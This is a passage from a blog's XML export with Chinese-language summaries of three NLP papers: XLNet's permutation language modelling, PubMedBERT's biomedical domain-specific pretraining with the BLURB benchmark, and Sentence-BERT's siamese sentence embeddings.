      </categories>
      <tags>
        <tag>预训练模型</tag>
        <tag>GPT</tag>
        <tag>知识对话</tag>
        <tag>语言模型</tag>
      </tags>
  </entry>
  <entry>
    <title>XLNET：基于置换语言任务的自回归模型</title>
    <url>/blog/2022/04/17/XLNET/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>XLNET 是由卡耐基梅隆大学和谷歌于 2019 年提出的<strong>自回归预训练模型</strong>，论文名为《XLNet: Generalized Autoregressive Pretraining for Language Understanding》，收录于 2019 NIPS 中。其动机是为了解决 BERT 面临的两个问题：忽视了 <strong>[MASK] token 间的依赖关系</strong>以及 [MASK] 导致的<strong>预训练 - 微调差异</strong>。 XLNet 在 20 项任务上的表现优于 BERT，通常大幅度提高，包括问答、自然语言推理、情感分析和文档排序。</p>
<span id="more"></span>
<h2 id="介绍">介绍</h2>
<h3 id="自编码vs自回归">自编码 vs 自回归</h3>
<p>预训练模型常在大规模语料上，通过构建无监督的预训练目标进行训练。其中，自回归 (AR) 语言建模和自编码 (AE) 是两个最成功的预训练目标。</p>
<p>自编码方法旨在通过从被破坏的输入重建数据，典型的例子为 BERT 的掩码语言模型（MLM），将若干 token 掩码为 [MASK]，通过上下文的其他 token 预测被掩码的 token。类似完形填空任务，将 “我吃饭了” 掩码为 "我吃 [MASK] 了"，预测 [MASK] 为 "饭"。但 BERT 的缺点在于，它对于多个 [MASK] 标记分开预测，换而言之，<strong>假设它们是互相独立的，没有考虑它们间的依赖关系</strong>。而且，在预训练过程中，[MASK] 的 token embedding 为空，对其后续的上下文表征没有任何帮助。而在下游微调任务中，当前 token 的 token embedding 对其上下文表征是最重要的。这就导致了上下游间的差异。</p>
<p>自回归的方法旨在使用自回归模型拟合语料的概率分布，典型的例子为 GPT 的语言模型。将句子概率<span class="math inline"> \(p(x)\)</span> 分解为条件概率的乘积，即<span class="math inline"> \(p(x)=\prod_t p(x_t|x_{&lt;t})\)</span>。这种方法非常符合人的认知，但是缺点是无法利用双向的上下文信息。而双向的上下文信息对于下游的理解任务是至关重要的。</p>
<p>XLNET 希望将 AR 和 AE 的优点结合起来，避免它们的局限性。XLNET 提出了一种名为置换语言模型的预训练目标，即<strong>打乱句子的 token 顺序并使用自回归的方法预测</strong>。这种方法不依赖于掩码、结合了双向上下文信息、自回归训练。XLNet 在许多下游任务上比 BERT 表现出色，包括 GLUE 语言理解任务、阅读理解任务（如 SQuAD 和 RACE），Yelp 和 IMDB 等文本分类任务，以及 ClueWeb09-B 文档排名任务。</p>
<h2 id="方法">方法</h2>
<h3 id="置换语言模型">置换语言模型</h3>
<p>对于长度为<span class="math inline"> \(T\)</span> 的序列<span class="math inline"> \(x\)</span>，存在<span class="math inline"> \(T!\)</span> 种排列可用于自回归生成。用<span class="math inline"> \(\mathcal Z_T\)</span> 代表所有长度为<span class="math inline"> \(T\)</span> 的序列<span class="math inline"> \([1,2,\cdots,T]\)</span> 的排列集合，<span class="math inline">\(z_t\)</span> 和<span class="math inline"> \(z_{&lt;t}\)</span> 分别代表排列<span class="math inline"> \(z\in\mathcal Z_T\)</span> 的第<span class="math inline"> \(t\)</span> 个和前<span class="math inline"> \(t-1\)</span> 个元素。置换语言模型的目标可形式化定义为： <span class="math display">\[
\max_\theta \mathbb E_{z\sim\mathcal Z_T}[\sum_{t=1}^Tlogp(x_{z_t}|x_{z_{&lt;t}})]
\]</span> 事实上，只需要每次随机采样一个排列序列<span class="math inline"> \(z\)</span>，优化对数似然即可。而且我们也不需要显式地改变句子顺序，只需要对 Attention 进行掩码即可。后面会介绍到。</p>
<h3 id="双流自注意力机制">双流自注意力机制</h3>
<p>虽然已经得到了形式化的训练目标，但是直接使用 Transformer-XL 优化上述目标可能是没什么用的。具体而言，如果使用标准的 softmax 计算下一个 token 的概率分布，即<span class="math inline"> \(p(X_{z_t}|x_{z_{&lt;t}})\)</span>，公式为 <span class="math display">\[
p(X_{z_t}=x|x_{z_{&lt;t}})=\frac{\exp(e(x)^Th_\theta(x_{z_{&lt;t}}))}{\sum_{x'}\exp(e(x')^Th_\theta(x_{z_{&lt;t}})}
\]</span> 其中，<strong><span class="math inline">\(h_\theta(x_{z_{&lt;t}})\)</span> 是<span class="math inline"> \(x_{z_{t}}\)</span> 的隐藏状态表征，<span class="math inline">\(e(x)\)</span> 是<span class="math inline"> \(x\)</span> 的嵌入向量。可以看到<span class="math inline"> \(h_\theta(x_{z_{&lt;t}})\)</span> 是与要预测的 token 的位置<span class="math inline"> \(z_t\)</span> 无关的。也就是</strong>无论下一个预测的 token 是哪个位置的，得到的概率分布都是相同的<strong>。这显然与我们的期望是相悖的。为了解决这个问题，需要</strong>重参数化<strong>这个概率分布，加入<span class="math inline"> \(z_t\)</span> 的信息： <span class="math display">\[
p(X_{z_t}=x|x_{z_{&lt;t}})=\frac{\exp(e(x)^Tg_\theta(x_{z_{&lt;t}},z_t))}{\sum_{x'}\exp(e(x')^Tg_\theta(x_{z_{&lt;t}},z_t)}
\]</span> 其中，</strong><span class="math inline">\(g_\theta\)</span> 是一种新的、依赖于下一个 token 位置的表征 **。</p>
<p>那么新的问题就来了，怎么建模这个<span class="math inline"> \(g_\theta\)</span> 呢？从形式上可以看出，<span class="math inline">\(g_\theta\)</span> 希望在根据位置<span class="math inline"> \(z_t\)</span> 从已有的上下文<span class="math inline"> \(x_{z_{&lt;t}}\)</span> 中通过注意力机制收集信息。这样就有了两种略显矛盾的需求：</p>
<ul>
<li>预测<span class="math inline"> \(x_{z_t}\)</span> 时，<span class="math inline">\(g_\theta(x_{z_{&lt;t}},z_t)\)</span> 只能依赖位置<span class="math inline"> \(z_t\)</span> 而非内容<span class="math inline"> \(x_{z_t}\)</span></li>
<li> 预测<span class="math inline"> \(j&gt;t\)</span> 的其他标记<span class="math inline"> \(x_{z_j}\)</span> 时，也需要<span class="math inline"> \(x_{z_t}\)</span> 的隐藏表征，此时<span class="math inline"> \(g_\theta(x_{z_{&lt;t}},z_t)\)</span> 应该编码<span class="math inline"> \(x_{z_t}\)</span> 的内容以充分利用上下文信息</li>
</ul>
<p>那么，就需要两种上下文表征：</p>
<ul>
<li><strong>内容表征</strong><span class="math inline"> \(h_\theta(x_{z_{\le t}})\)</span>，简写为<span class="math inline"> \(h_{z_{\le t}}\)</span>，类似标准 Transformer 中的隐藏状态，同时编码上下文和位置</li>
<li><strong>查询表征</strong><span class="math inline"> \(g_\theta(x_{z_t})\)</span>，简写为<span class="math inline"> \(g_{z_t}\)</span>，只根据<span class="math inline"> \(h_{z_{&lt;t}}\)</span> 和位置<span class="math inline"> \(z_t\)</span> 计算得到</li>
</ul>
<p>为便于计算，查询流的第一层初始化为可训练的向量，即<span class="math inline"> \(g_i^{(0)}=w\)</span>，内容流初始化为嵌入向量，即<span class="math inline"> \(h_i^{(0)}=e(x_i)\)</span>。对于其它层<span class="math inline"> \(m=1,\cdots,M\)</span>，使用共享参数更新两种流的向量表征，示意图如下所示：</p>
<p><img src="two-stream.png"></p>
<ul>
<li>图 (a) 为内容流注意力，类比标准 Transformer 中的自注意力，query、key、value 均为有内容的向量表征。</li>
<li>图 (b) 为查询流注意力，不能获取当前位置的内容<span class="math inline"> \(x_{z_t}\)</span>，以其位置<span class="math inline"> \(z_t\)</span> 为 query，key、value 也均为有内容的向量表征。</li>
<li>图 (c) 为置换语言模型的训练过程。采样一个排列<span class="math inline"> \(3,2,4,1\)</span>，内容流中，1 可以看到 3,2,4，且根据 1 的内容计算双向自注意力，其 Attention 不需要遮挡；2 只能看到 3 和它本身，因此位置 1,4 需要被遮挡。以此类推。查询流与内容流类似，不过需要额外去掉当前位置的内容，即矩阵中的主对角线全部被遮挡。</li>
</ul>
<p>更新公式可以示意为（<strong>注意 KV 里下标<span class="math inline"> \(&lt;,\le\)</span> 的差异</strong>）： <span class="math display">\[
g_{z_t}^{(m)}\leftarrow Attention(Q=g_{z_t}^{(m-1)},KV=h_{z_{&lt;t}}^{(m-1)};\theta)\\
h_{z_t}^{(m)}\leftarrow Attention(Q=h_{z_t}^{(m-1)},KV=h_{z_{\le t}}^{(m-1)};\theta)
\]</span> 使用最后一层的<span class="math inline"> \(g_{z_t}^{(M)}\)</span> 来计算上述的条件概率<span class="math inline"> \(p(X_{z_t}=x|x_{z_{&lt;t}})\)</span>。在微调的时候，可以直接将查询流丢弃。</p>
<h3 id="部分预测">部分预测</h3>
<p>虽然上述理论很美好，但是早期实验证实其收敛很慢。很容易理解，排列中前一部分的 token 的上下文位置随机，预测下一随机位置的 token 是困难的。为了优化方便，论文只预测排列中最后一部分的 token，它们的上下文最为丰富。形式化而言，将排列<span class="math inline"> \(z\)</span> 划分为上下文<span class="math inline"> \(z_{\le c}\)</span> 和目标<span class="math inline"> \(z_{&gt; c}\)</span>，c 为切分点。使用超参数<span class="math inline"> \(|z|/(|z|-c)\approx K\)</span> 控制这个比例。这里类似 BERT 里控制 [MASK] 比例，理论上当然是越大越好，但是太大了不易收敛。上下文部分<span class="math inline"> \(z_{\le c}\)</span> 的查询流也不需要计算了，可以节省时间和内存。</p>
<h3 id="集成transformer-xl">集成 Transformer-XL</h3>
<p>在 Transformer-XL 的基础上，添加：</p>
<ul>
<li><strong>相对位置编码</strong></li>
<li><strong>段循环机制</strong></li>
</ul>
<p>主要介绍下段循环机制。对于过长的输入，往往需要以固定长度 T（如 512）将其分段（segment）。假设两段输入分别为<span class="math inline"> \(\tilde x=s_{1:T},x=s_{T+1:2T}\)</span>，<span class="math inline">\(\tilde z,z\)</span> 分别为其排列顺序，<span class="math inline">\(\tilde h^{(m)}\)</span> 为 m 层的向量表征。对于段<span class="math inline"> \(x\)</span>，计算注意力时可以添加<span class="math inline"> \(\tilde h^{(m-1)}\)</span> 的注意力，类似记忆网络（Memory Network），如下式所示： <span class="math display">\[
h_{z_t}^{(m)}\leftarrow Attention(Q=h_{z_t}^{(m-1)},KV=[\tilde h^{(m-1)},h_{z_{\le t}}^{(m-1)}];\theta)
\]</span> 这样可以缓存和重用前一段的模型结果。</p>
<h3 id="多段建模">多段建模</h3>
<p>许多下游任务以多个段为输入，例如问答、对话等。XLNET 参考 BERT，构建 [CLS, A, SEP, B, SEP] 的输入，用以进行置换语言模型训练。不过事实上，XLNET 并没有使用下句预测的预训练任务，因为它在消融实验里并没有带来帮助。</p>
<p>继承自相对位置编码的思想，XLNET 引入了<strong>相对段编码</strong>。与为每个段显式加入绝对段编码的 BERT 不同，XLNET 使用两个相对段编码<span class="math inline"> \(s_+,s_-\)</span> 衡量两个位置<span class="math inline"> \(i,j\)</span> 是否来自同一个段，<span class="math inline">\(s_+,s_-\)</span> 是每个注意力头可学习的参数。换而言之，XLNET 只考虑两个位置是否来自一个段，不关心它们来自哪两个段。当位置<span class="math inline"> \(i\)</span> 向<span class="math inline"> \(j\)</span> 计算注意力时，段编码<span class="math inline"> \(s_{ij}\)</span> 用以计算权重<span class="math inline"> \(a_{ij}=(q_i+b)^Ts_{ij}\)</span>，<span class="math inline">\(q_i\)</span> 是标准的查询向量，<span class="math inline">\(b\)</span> 为特定于注意力头的可学习的偏差向量，得到的<span class="math inline"> \(a_{ij}\)</span> 被添加到注意力 ij 间的权重上。直观而言，如果 ij 来自同一个段，这个权重应该更大，反之则更小。相较于绝对段编码，相对段编码更易扩展，而且可以提高泛化能力。</p>
<h2 id="实验">实验</h2>
<h3 id="设置">设置</h3>
<ul>
<li>预训练数据：包含 BookCorpus、Wikipedia、Giga5、ClueWeb 2012-B 等，共 126GB。BERT 只使用了前两项共 13GB。</li>
<li>参数规模：XLNET-Large 和 BERT-Large 架构一致</li>
<li>训练成本：512 块 TPU，500k 步，5.5 天，完了还是欠拟合</li>
<li> K=6，即只预测一个句子排列的末尾<span class="math inline"> \(1/6\approx 17%\)</span>，与 BERT 15% 的掩码率相近</li>
<li>微调：<strong>基于跨度的预测</strong>（span-based prediction）。随机采用一个长度<span class="math inline"> \(L\in [1,2,3,4,5]\)</span>，随机采样一段长为 L 的连续的跨度作为预测目标。</li>
</ul>
<h3 id="与bert的公平比较">与 BERT 的公平比较</h3>
<p>XLNET 与 BERT 在相同数据集上训练、架构一致。BERT 选取原生 BERT、全词掩码、无下句预测三种版本中的最优结果。下表为 GLUE、SQuAD 数据集的结果。可以看到在不同下游任务上，XLNET 均超越 BERT，一般一两个点。</p>
<p><img src="fair-comparison.png"></p>
<h3 id="其他结果">其他结果</h3>
<p>下面的 XLNET 就是全量数据上的结果了。</p>
<p>下表为在 RACE（阅读理解任务）和 onClueWeb09-B（文档排序任务）测试集的最新结果的比较。RACE 数据集以长度著称，考验了模型的长片段信息捕捉能力。ClueWeb09-B 文档排序数据集，主要用于测试模型生成的词向量效果。可以看到 XLNET 都是最优的。</p>
<p><img src="scaling.png"></p>
<p>下表为在 SQuAD 数据集上的结果，大幅领先 BERT，略优于 RoBERTa。</p>
<p><img src="SQuAD.png"></p>
<p>下表为在多个文本分类数据集上的实验结果，主要与 BERT 比较。</p>
<p><img src="text-classification.png"></p>
<p>下表为在 GLEU 数据集上，与 RoBERTa 等模型的比较结果。还是大幅领先 BERT，略优于 RoBERTa。</p>
<p><img src="GLEU.png"></p>
<h3 id="消融实验">消融实验</h3>
<p>消融实验旨在具体探究：</p>
<ul>
<li>置换语言模型的有效性，对比 MLM</li>
<li>Transformer-XL 架构的重要性</li>
<li>一些其他细节：基于跨度预测、双向输入、下句预测</li>
</ul>
<p>为了公平比较，所有模型都基于 12 层架构，具有与 BERT-Base 相同的模型超参数，并且仅在 Wikipedia 和 BooksCorpus 上进行训练。基线为原始的 BERT-Base 以及使用降噪自编码器（DAE）训练的 Transformer-XL。DAE 和 BERT 差别在于，BERT 只预测 [MASK] token，DAE 预测所有 token。结果如下表所示。</p>
<p><img src="ablation.png"></p>
<p>1-4 行可以看出，Tranformer-XL 和置换语言模型确实提供了性能提升。如果删去内存缓存机制（第 5 行），性能明显下降，尤其是涉及长上下文的任务。6-7 行显示，基于跨度的预测和双向输入在 XLNet 中都起着重要作用。最后，不出所料的是，下句预测在 XLNET 里也不一定会带来改进。因此 XLNET 也将其排除在预训练目标之外。</p>
<h2 id="总结">总结</h2>
<p>本文提出了一种名为置换语言模型的预训练任务及配套的预训练模型 XLNET，旨在结合自回归和自编码两种预训练目标的优点。消融实验证明，所提出的置换语言模型的预训练目标是有效的，在各项自然语言理解任务上比 BERT 取得了显著改进。不过相较于 RoBERTa 的提升不大。考虑到 RoBERTa 的<strong>可并行性</strong>，可能 NLU 任务还是偏好 RoBERTa 吧。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/71916499">飞跃芝麻街：XLNet 详解 - 知乎 (zhihu.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>预训练模型</category>
      </categories>
      <tags>
        <tag>预训练模型</tag>
        <tag>自然语言处理</tag>
        <tag>XLNET</tag>
      </tags>
  </entry>
  <entry>
    <title>ACM 2021: 生物医学域的语言模型</title>
    <url>/blog/2022/04/10/Biomedical-LM/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>《Domain-Specific Language Model Pretraining for Biomedical Natural Language Processing》为微软研究院发表的论文，收录于 2021 年 ACM 中。论文旨在探讨，特定领域的预训练也可以从通用领域语言模型开始受益，这一假设是否适用于具有大规模未标记数据的领域（例如生物医学）。论文证实，相较于从通用领域继续预训练，从头开始训练预训练模型能够获得更好的性能。此外，论文还提出了一个新的生物医学 NLP 基准 BLURB，并创建了排行榜。</p>
<span id="more"></span>
<h2 id="介绍">介绍</h2>
<p>NLP 中，在未标记文本上自监督地训练预训练模型，加之以目标域微调，已经被证实为是行之有效的迁移学习策略，尤其是在目标域数据稀缺、源域和目标域高度相关的情况下。尚不清楚特定领域的预训练是否可以从通用领域的迁移中受益。在生物医学领域，已有的工作表明使用域内文本可以提供超过通用域语言模型的额外收益。然而，这些工作都基于一个普遍的假设 -- 域外文本依然是有用的，并且通常采用混合域方法，例如，通过从现有的通用域语言模型开始特定域的预训练。</p>
<h3 id="混合域方法">混合域方法</h3>
<p>混合域方法如下图上半部分所示。基于在互联网、维基百科等预训练得到的通用语言模型，继续进行特定域的预训练。</p>
<p><img src="comparison.png"></p>
<p>然而，这种方法存在以下问题：</p>
<ul>
<li><strong>文本差异</strong>。生物医学领域的文本和通用域文本有较大差异，混合域方法增加了负迁移的可能性。</li>
<li><strong>词表差距</strong>。目标域与通用域的词表差距较大。以 BERT 为例，BERT 的词表是从 Wikipedia 和 BookCorpus 生成的，这与生物医学域的词汇差距较大。例如 "naloxone" 一词（纳洛酮），医学里的常用名词，在 BERT 中被拆为四块：[na, ##lo, ##xon, ##e]</li>
</ul>
<h3 id="从头开始训练">从头开始训练</h3>
<p>上图的下半部分是从头开始进行特定域的预训练的例子（train from scratch）。from scratch 是从头开始的意思，引申一下就是不使用预训练模型，从头开始训练。</p>
<p>如果目标域本身的文本很少，则混合域预训练方法是有意义的，因为可以从使用相关领域的预训练中受益。但是，生物医学并非如此，它在 PubMed 中拥有超过 3000 万个摘要。因此，从头开始的特定领域预训练可能是更好的训练策略。它的优点有：</p>
<ul>
<li><strong>域内数据</strong>。使用的数据全部来自域内，不受其他领域文本的影响。</li>
<li><strong>域内词表</strong>。不受通用域词表限制。</li>
<li><strong>随机初始化</strong>。神经网络训练使用非凸优化，这意味着<strong>持续的预训练可能无法从通用域语言模型中完全撤消次优初始化</strong>。</li>
</ul>
<p>论文实验表明，在生物医学领域，从头开始的特定领域预训练大大优于通用语言模型的继续预训练，从而证明支持混合领域预训练的普遍假设并不总是适用。</p>
<p>此外，论文在提出了一个生物医学语言理解和推理基准 BLURB（Biomedical Language Understanding &amp; Reasoning Benchmark），并在 https://aka.ms/BLURB 创建了排行榜。基准中包含：命名实体识别（NER）、循证医学信息提取（PICO）、关系抽取、句子相似度、文档分类、问答等子任务。将子任务得分加权后得到总分数。</p>
<p>BLURB 涉及到的任务类型、数据规模和评估指标如下表所示。</p>
<p><img src="task-intro.png"></p>
<h2 id="方法">方法</h2>
<p>采用<strong>预训练 + 特定任务微调</strong>的范式： ### 模型设置</p>
<ul>
<li>词表：Word Piece 子词模型</li>
<li>预训练任务包含下局预测（NSP）任务，以便与 BERT 比较</li>
<li>全词掩码 (WWM)，掩码率为 15%</li>
<li> 数据集：PubMed5 摘要，包含 1400 万个摘要，32 亿个单词，21 GB。</li>
</ul>
<h3 id="特定任务微调">特定任务微调</h3>
<p>从同一个预训练 BERT 开始，按照下图的架构，依次执行</p>
<ul>
<li><strong>输入转换</strong>：转换为任务所需的输入。例如关系抽取任务中，需要用特殊符号替换实体词；QA 中需要加入特殊分隔符等。</li>
<li><strong>模型计算</strong>：得到编码向量。</li>
<li><strong>特征抽取</strong>：从向量中选择任务所需的特征。例如，分类任务取 [CLS] 符号的表征向量，NER 取每个 token 的表征向量。</li>
<li><strong>预测</strong>：根据任务 + 特征进行预测。例如，NER 使用线性层 / LSTM/CRF 进行分类，句子相似度使用线性层执行回归等。</li>
</ul>
<p><img src="task-specific-finetune.png"></p>
<p>BLURB 中的六个任务可分别定义为 token / 句子级别的分类 / 回归任务，如下表所示。</p>
<p><img src="tasks.png"></p>
<h2 id="实验">实验</h2>
<h3 id="基线模型">基线模型</h3>
<p>实验涉及到的一些基线模型如下：</p>
<p><img src="baselines.png"></p>
<p>其中，SciBERT 是使用生物医学和计算机科学的数据，从头开始生成词汇和预训练。 然而，从生物医学应用的角度来看，SciBERT 仍然采用混合域预训练方法，因为计算机科学文本显然是域外的。<code>Wiki + Books</code> 的词表，即 BERT 的词表，意味着模型都是从 BERT 继续预训练的。</p>
<p>可以看到，除了本文的 <code>PubMedBERT</code>，其他模型都是混合域训练的方法。</p>
<h3 id="实验结果">实验结果</h3>
<p>BLURB 上的结果如下表所示，其中所有的 BERT 模型都经过了相同的微调过程。通过从头开始进行特定领域的预训练，PubMedBERT 在大多数生物医学 NLP 任务中明显优于其他 BERT 模型。与使用域外文本训练的 BERT 模型相比，收益最为显着。</p>
<p><img src="overview-result.png"></p>
<h3 id="消融实验">消融实验</h3>
<h4 id="词表">词表</h4>
<p>针对两种词表 &amp; 两种掩码方式，论文使用 PubMedBERT 进行了消融实验。换而言之，两边的预训练方法都是从头开始的，不过是词表和掩码方式有所差异。结果如下表。可以看出，全词掩码是明显优于普通掩码的。从 PubMed 构建的词表在大多数任务上都是优于原始 BERT 的词表的。</p>
<p><img src="vocab-wwm.png"></p>
<p>从词表将句子编码后的平均长度也可以看出来，如下表，可以看出 PubMed 构建的词表的句子平均长度更短，在 QA 上达到了上百的差异。这里也可以看出，原始的 BERT 的词表在 BioASQ 任务上的 tokenize 后的平均句子长度为 <strong>702.4&gt;512，句子被截断了</strong>，怪不得在这个数据集上跟 PubMedBERT 差了十几个点。。。</p>
<p><img src="vocab-length.png"></p>
<h4 id="预训练方法">预训练方法</h4>
<p>下表展示了预训练预料、训练时间对性能的影响。前两列均使用从通用语料 + 生物医学语料混合域预训练的方法，不过词表不同。两列性能比较互有来回，猜测是由于只根据单一域构建词表，混合域预训练性能受限，与只训练一半时间的 PubMed 类似。</p>
<p><img src="ptr-method.png"></p>
<p><strong>对抗预训练</strong></p>
<p>结果如下表所示。对抗预训练还损害了性能。作者认为可能是由于域内语料类别单一，如果预训练语料库更加多样化且相对域外，则对抗性训练更有用。</p>
<p><img src="adversial.png"></p>
<h3 id="微调方法">微调方法</h3>
<p>以 NER、关系抽取为例，在 BERT 之前，都是使用 LSTM 和 CRF 进行标注。由于 BERT 横扫榜单，这种显式建模方法的实用性遭到了质疑。BERT 模型的顶层已经捕获了整个文本范围内的许多非线性依赖关系。直接进行分类也可以取得很好的效果。在下表中（F1 分数）也可以看出，线性层对在 5 个数据集上都取得了最优。而且线性层是可并行的，LSTM 还要引入额外的串行开销。</p>
<p><img src="ner-ablation.png"></p>
<p><strong>关系抽取中的虚拟化方法和关系编码的影响</strong>。虚拟化（dummify）方法是指在关系抽取中，为了防止过拟合，往往使用特殊符号（例如 $DRUG 和 $GENE）替换实体词。关系编码是指用于关系分类的向量，例如 [CLS] 或者特殊实体开始标记。</p>
<p>论文对关系编码的三种方法：[CLS]、实体词向量的最大池化、实体首符号的向量，以及输入实体符号的方法：虚拟化、原始文本、在实体前后添加标记进行了比较实验。结果如下表所示。简单地使用原始文本确实会使神经方法面临过拟合风险。对原始文本使用 [CLS] 是最糟糕的选择，因为很难判定要抽取哪两个实体间的关系。虚拟化仍然是最可靠的方法，它适用于任何一种关系编码方法。有趣的是，使用实体标记会在两个数据集中产生稍好的结果，因为它似乎可以防止过度拟合，同时保留有用的实体信息。</p>
<p><img src="relation-extraction.png"></p>
<h2 id="总结">总结</h2>
<p>这篇论文研究了” 通用域预训练模型，对于拥有大量未标记文本的特定域的迁移学习，是否有效 “的问题。在生物医学领域的实验表明，从头开始训练（train from scratch）是更好的选择。论文中还做了非常详细的消融实验，逐个探究词表、训练数据等的影响。</p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>预训练模型</category>
      </categories>
      <tags>
        <tag>BERT</tag>
        <tag>迁移学习</tag>
        <tag>生物医学</tag>
      </tags>
  </entry>
  <entry>
    <title>Sentence-BERT: 减小语义相似度的计算开销</title>
    <url>/blog/2022/04/04/Sentence-BERT/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>BERT、RoBERTa 此类预训练模型虽然能够提升语义文本相似度（STS）任务的性能，但是在某些场景下会带来巨大的计算开销。例如，利用 BERT 从 10000 个句子的集合中找到最相似的两个句子，需要进行约 5000 万次推理，大约 65 个小时。因此，《Sentence-BERT: Sentence Embeddings using Siamese BERT-Networks》，来自 EMNLP 2019，提出了 Sentence-BERT（SBERT），使用孪生或三胞胎 BERT + 余弦相似度计算语义相似度。可以将上述例子的 65 小时降低至 5 秒钟，同时保证准确率。STS 和迁移任务上的实验证明，SBERT 和 SRoBERTa 已经成为句向量标识的 SOTA 方法。 <span id="more"></span></p>
<h2 id="介绍">介绍</h2>
<p>BERT 的结构限制了其不适用于某些任务：大规模文本相似度比较、聚类、信息检索。摘要中已经提到了第一种的例子。聚类和信息检索通常需要将句子映射为一个固定维度的向量，使得相似的句子在语义空间中相近。BERT 虽然也能将句子映射为特定的向量，例如取最后一层 [CLS] 的 token embedding，或者做平均池化。但是，实验证明，这样的到的向量甚至差于 GloVe 嵌入的平均。</p>
<p>SBERT 通过以下步骤解决这个问题：</p>
<ol type="1">
<li><p>孪生 BERT 将句子映射为固定维度向量</p></li>
<li><p>使用相似度度量（余弦相似度、欧氏距离、曼哈顿距离...）</p></li>
</ol>
<p>换而言之，即取消两个句子同时馈入网络的要求，利用相似度度量控制学习得到好的单个句子的嵌入。结构如下图所示：</p>
<figure>
<img src="architecture.png" alt="结构"><figcaption aria-hidden="true">结构</figcaption>
</figure>
<p>两个句子被分别编码 + 平均池化得到向量表证后，构建计算语义相似度的分类任务（左图）或者回归任务（有图）。</p>
<p>作者在 NLI 数据上微调 SBERT，在 7 个 STS 任务上，SBERT 取得了 11.7 个点的提升，相较于 InferSent 和 Universal Sentence Encoder。在 SentEval 上，SBERT 分别取得了 2.1 和 2.6 个点的提升。</p>
<h2 id="方法">方法</h2>
<p>SBERT 的核心步骤已经在上面介绍了，但还有一些细节需要考虑：</p>
<ol type="1">
<li>如何得到固定维度的向量：[CLS]/ 平均池化 / 最大池化</li>
<li>训练目标：分类 / 回归 / 三元组</li>
</ol>
<p>其中，模型的结构（孪生、三胞胎）、训练目标与可用的训练数据息息相关。</p>
<p><strong>分类目标</strong>：将两个句子向量及逐元素差<span class="math inline"> \(u,v,|u-v|\)</span> 馈入 MLP，并进行 SoftMax 进行分类，公式为： <span class="math display">\[
o_t=softmax(W_t(u,v,|u-v|))
\]</span> <strong> 回归目标</strong>：与分类类似，区别在于计算<span class="math inline"> \(u,v\)</span> 的余弦相似度，使用 MSE 损失。</p>
<p><strong>三元组目标</strong>：给定一个原始句子<span class="math inline"> \(a\)</span>，一个正面句子<span class="math inline"> \(p\)</span>，一个负面例子<span class="math inline"> \(n\)</span>，减小<span class="math inline"> \(a,p\)</span> 之间的距离，增大<span class="math inline"> \(a,n\)</span> 之间的距离，即要<strong>最小化下式的损失</strong>： <span class="math display">\[
\max(||s_a-s_p||-||s_a-s_n||+\epsilon,0)
\]</span> 其中，<span class="math inline">\(s_x\)</span> 为句子<span class="math inline"> \(x\)</span> 的嵌入向量，<span class="math inline">\(||\cdot||\)</span> 为句子度量，<span class="math inline">\(\epsilon\)</span> 为边界，用以保证<span class="math inline"> \(s_p\)</span> 至少<span class="math inline"> \(\epsilon\)</span> 比<span class="math inline"> \(s_n\)</span> 更靠近<span class="math inline"> \(s_a\)</span>，即<span class="math inline"> \(||s_a-s_p||+\epsilon&lt;||s_a-s_n||\)</span>。当这个式子不成立时，损失为 0，参数不进行更新。实验中使用的距离度量为欧氏距离，<span class="math inline">\(\epsilon=1\)</span>。</p>
<h3 id="训练细节">训练细节</h3>
<p>作者使用 SNLI、Multi-Genre NLI 数据集训练 SBERT。其中，SNLI 数据集由 57 万个句子对 + 标签组成，MultiNLI 由 43 万个句子对组成，带有文本蕴含信息。</p>
<h2 id="实验">实验</h2>
<p>在语义文本相似度任务上进行实验验证。传统方法通常学习一个（复杂的）回归函数，将句子嵌入映射到相似性分数。 然而，这些回归函数以句子对为输入，难以扩展且面临组合爆炸问题。SBERT 则总是使用余弦相似度来比较两个句子之间的相似度嵌入。 负曼哈顿距离和负欧几里得距离的实验结果也大致相同。</p>
<h3 id="无监督sts">无监督 STS</h3>
<p>不使用任何 STS 特定的训练数据。评估数据集为 STS tasks 2012 - 2016， STS benchmark，SICK-Relatedness。每个数据集的句子对包含 0 到 5 的的语义关联标签。评估指标上（两个相似度分数），不使用皮尔逊相关系数（Pearson correlation coefficient），因为它主要衡量随机变量间的<strong>线性相关性</strong>。而是使用斯皮尔曼等级相关系数（Spearman's rank correlation coefficient），它可以衡量<strong>等级变量间的单调性</strong>，因而更适用于 STS 场景。毕竟两个分数间的相关性不一定是线性的。</p>
<p>实验结果如下表所示。可以看到 naive 的 BERT embedding 差于 GloVe embedding，SBERT 和 SRoBERTa 几乎全面领先，除了 SICK-R。这可能与 Universal Sentence Encoder 训练的新闻、问答等语料有关。</p>
<p><img src="unsupervised-result.png"></p>
<h3 id="监督sts">监督 STS</h3>
<p>使用 STS benchmark (STSb) 数据集进行训练。该数据集包括来自标题、新闻和论坛三个类别的 8,628 个句子对，分为训练集（5,749）、验证集（1,500）和测试集（1,379）。</p>
<p>实验结果如下表所示。作者实验了两种训练策略，只在 STSb 上进行训练和在 NLI 数据集上预训练，再在 STSb 数据集上微调。后者能够带来 1-2 个点的提升。可以看到 SBERT 和 BERT 之间的差距不大。</p>
<p><img src="supervised-result.png"></p>
<h3 id="争论方面的相似性">争论方面的相似性</h3>
<p>Argument Facet Similarity （AFS）语料库注释了来自社交媒体对话的 6,000 个句子论点对，涉及三个有争议的主题：枪支管制、同性婚姻和死刑。数据的标签范围从 0（“不同主题”）到 5（“完全等效”）。 AFS 语料库中的相似性概念与 SemEval 的 STS 数据集中的相似性概念完全不同。 STS 数据通常是描述性的，而 AFS 数据是对话中的争论性摘录。要被认为是相似的，争论不仅必须提出相似的主张，而且还必须提供相似的论证。此外，AFS 中句子之间的词汇差距要大得多。因此，简单的无监督方法以及最先进的 STS 系统在该数据集上表现不佳。</p>
